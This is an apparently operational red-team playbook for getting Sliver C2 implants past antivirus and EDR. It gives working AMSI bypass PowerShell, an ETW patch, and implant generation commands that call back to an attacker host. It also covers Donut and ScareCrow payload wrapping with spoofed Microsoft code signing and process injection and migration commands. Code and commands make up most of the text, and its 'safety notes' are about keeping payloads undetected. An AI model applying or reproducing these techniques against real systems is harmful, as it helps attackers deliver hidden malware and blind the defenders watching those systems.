# C2 Evasion — Implant Hardening & Defense Bypass

## Overview

Harden Sliver implants against AV/EDR detection before delivery. Applies a
multi-layer evasion pipeline: shellcode generation, Donut processing (AMSI/ETW
bypass), ScareCrow wrapping (EDR unhooking, indirect syscalls, code signing),
process migration, and pre-flight testing. Includes AMSI bypass, ETW patching,
custom implant compilation, and process injection techniques.

## Evasion Decision Tree

```
Identify Target Defenses
├── No AV/EDR (lab) → Skip evasion, raw implant
├── Defender Only → Basic evasion (ScareCrow wrap)
├── EDR Present → Full pipeline (Donut + ScareCrow + pre-flight)
└── Unknown → Assume full EDR, apply maximum evasion
```

## Phase 1: Defense Assessment

### Identify Target Defenses

From prior recon (process list, services, tech_fingerprint.json):

```bash
# Check for common AV/EDR processes on target
# Windows:
tasklist | findstr /i "MsMpEng CSFalcon SentinelAgent CbDefense CylanceSvc cortex"

# Linux:
ps aux | grep -iE "falcon|sentinel|crowdstrike|sophos|eset|clam"
```

| Process Name | Product | Defense Level |
|-------------|---------|---------------|
| MsMpEng.exe | Windows Defender | basic |
| CSFalconService.exe | CrowdStrike Falcon | full |
| SentinelAgent.exe | SentinelOne | full |
| CbDefense.exe | Carbon Black | full |
| CylanceSvc.exe | Cylance | full |
| CortexXDR.exe | Palo Alto Cortex XDR | full |
| MsMpEng.exe only | Defender (no EDR) | basic |
| None detected | No AV | none |

## Phase 2: AMSI Bypass (Windows Targets)

AMSI (Antimalware Scan Interface) scans scripts/commands before execution.
Must patch AMSI before running PowerShell download cradles or .NET assemblies.

### AMSI Bypass via PowerShell (Pre-Delivery)

```powershell
# Method 1: AmsiScanBuffer patch (in-memory)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Method 2: AmsiScanBuffer return-zero patch
[Runtime.InteropServices.Marshal]::WriteByte(
  ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
    'amsiContext','NonPublic,Static').GetValue($null)),0x80000000,0x57)

# Method 3: Force error in amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils').
  GetField('am'+'siIn'+'itFailed','NonPublic,Static').SetValue($null,$true)
```

### AMSI Bypass via Sliver BOF

```bash
# Use inline-execute with AMSI patching BOF
sliver [session] > inline-execute /opt/tools/bofs/amsi_patch.x64.o
```

## Phase 3: ETW Patching (Windows Targets)

ETW (Event Tracing for Windows) logs .NET assembly loads, process creation,
network connections. Patch it to blind EDR telemetry.

### ETW Patch via PowerShell

```powershell
# Patch EtwEventWrite to return immediately
$ntdll = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE(
  [Reflection.Assembly]::LoadWithPartialName('ntdll').GetModules()[0])
$etwAddr = [Win32]::GetProcAddress($ntdll, 'EtwEventWrite')
[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr, 0xc3)  # ret
```

### ETW Patch via Sliver BOF

```bash
sliver [session] > inline-execute /opt/tools/bofs/etw_patch.x64.o
```

## Phase 4: Evasion Pipeline

### Step 1: Generate Shellcode

```bash
# Generate raw shellcode from Sliver
sliver > generate --mtls <KALI_IP>:8888 --os windows --arch amd64 \
  --format shellcode --save /tmp/raw.bin
```

### Step 2: Donut Processing (AMSI/ETW Bypass Baked In)

```bash
# Convert to position-independent shellcode with AMSI/ETW bypass
donut -i /tmp/raw.bin -o /tmp/donut.bin \
  -a 2          `# x64 architecture` \
  -e 3          `# AES256 + random key encryption` \
  -z 2          `# aPLib compression` \
  -b 1          `# AMSI/WLDP bypass` \
  -k 1          `# ETW bypass` \
  -j "svchost"  `# Decoy module name`

# For .NET assemblies (Rubeus, SharpHound, etc.)
donut -i /opt/tools/Rubeus.exe -o /tmp/rubeus_donut.bin \
  -a 2 -e 3 -b 1 -k 1 -p "kerberoast"
```

### Step 3: ScareCrow Wrapping (EDR Unhooking + Syscalls)

```bash
# Full evasion with code signing
ScareCrow -I /tmp/donut.bin \
  -Loader dll \
  -domain microsoft.com \
  -sign \
  -encryptionmode AES

# Alternative loaders for different delivery methods
ScareCrow -I /tmp/donut.bin -Loader binary -domain microsoft.com -sign
ScareCrow -I /tmp/donut.bin -Loader wscript -domain microsoft.com
ScareCrow -I /tmp/donut.bin -Loader control -domain microsoft.com -sign
ScareCrow -I /tmp/donut.bin -Loader msiexec -domain microsoft.com
```

### Step 4: Pre-Flight Testing

```bash
# Test against ThreatCheck (Defender signature scanner)
ThreatCheck -f /tmp/scarecrow_output.exe -e Defender

# Test against DefenderCheck
DefenderCheck /tmp/scarecrow_output.exe

# Check file entropy (should be < 7.9 to avoid heuristic flags)
python3 -c "
import math, collections
data = open('/tmp/scarecrow_output.exe','rb').read()
freq = collections.Counter(data)
entropy = -sum((c/len(data))*math.log2(c/len(data)) for c in freq.values())
print(f'Entropy: {entropy:.2f} (target: < 7.9)')
"
```

### Automated Pipeline

```bash
python3 /opt/tazosploit/scripts/evasion_pipeline.py \
  --input /tmp/raw.bin \
  --defense-level <none|basic|full> \
  --target-os windows \
  --arch x64 \
  --json
```

## Phase 5: Process Migration & Injection

After initial implant execution, migrate to a stable process to avoid
detection when the initial process exits.

### Process Migration (Sliver)

```bash
# List processes to find suitable migration target
sliver [session] > ps

# Migrate to a long-lived SYSTEM process
sliver [session] > migrate <PID>

# Good migration targets (Windows):
# - svchost.exe (multiple instances, SYSTEM)
# - RuntimeBroker.exe (user-level, less suspicious)
# - explorer.exe (user session, survives logoff)
# - spoolsv.exe (Print Spooler, SYSTEM)

# Good migration targets (Linux):
# - /usr/sbin/cron (root)
# - /usr/sbin/sshd (root)
# - /usr/lib/systemd/systemd (root, PID 1 child)
```

### Process Injection Techniques

```bash
# Inject into remote process (Sliver)
sliver [session] > inject <PID> --shellcode /tmp/payload.bin

# Process hollowing (via BOF)
sliver [session] > inline-execute /opt/tools/bofs/process_hollow.x64.o \
  --process svchost.exe --shellcode /tmp/donut.bin

# Early bird injection (thread hijack)
sliver [session] > inline-execute /opt/tools/bofs/early_bird.x64.o \
  --target notepad.exe --shellcode /tmp/donut.bin
```

## Phase 6: Custom Implant Compilation

### Custom Sliver Implant with Traffic Shaping

```bash
# Generate with custom C2 profile (mimic legitimate traffic)
sliver > generate --mtls <KALI_IP>:8888 --os windows --arch amd64 \
  --name WindowsUpdate \
  --skip-symbols \
  --debug \
  --save /tmp/custom_implant.exe

# Generate with multiple C2 endpoints (failover)
sliver > generate --mtls <KALI_IP>:8888 --http <KALI_IP>:443 \
  --os windows --arch amd64 \
  --reconnect 30 \
  --max-errors 100 \
  --save /tmp/resilient_implant.exe
```

### Cross-Compilation for Different Targets

```bash
# ARM64 Linux (IoT, embedded)
sliver > generate --mtls <KALI_IP>:8888 --os linux --arch arm64 \
  --format elf --save /tmp/implant_arm64

# x86 Windows (legacy 32-bit systems)
sliver > generate --mtls <KALI_IP>:8888 --os windows --arch 386 \
  --format exe --save /tmp/implant_x86.exe
```

## ScareCrow Loader Reference

| Loader  | Output  | Stealth | Delivery Method |
|---------|---------|---------|-----------------|
| dll     | .dll    | Best    | DLL sideloading via trusted app |
| binary  | .exe    | Good    | Direct execution |
| wscript | .js     | Good    | Web delivery, HTML smuggling |
| control | .cpl    | Good    | Control panel extension |
| msiexec | .msi    | OK      | MSI package (admin required) |

## Evidence Collection

- Defense assessment results (AV/EDR identified)
- Evasion pipeline steps applied and results
- Pre-flight test output (ThreatCheck/DefenderCheck)
- Final payload hash and entropy score
- AMSI/ETW bypass method used
- Process migration target and success confirmation
- ScareCrow loader type and signing details

## Safety Notes

- **NEVER** upload payloads to VirusTotal — burns signatures permanently
- Pre-flight test in isolated VM only
- Document all evasion techniques for the final report
- Golden implants expire — re-test after Defender signature updates
- External engagements MUST use full evasion chain
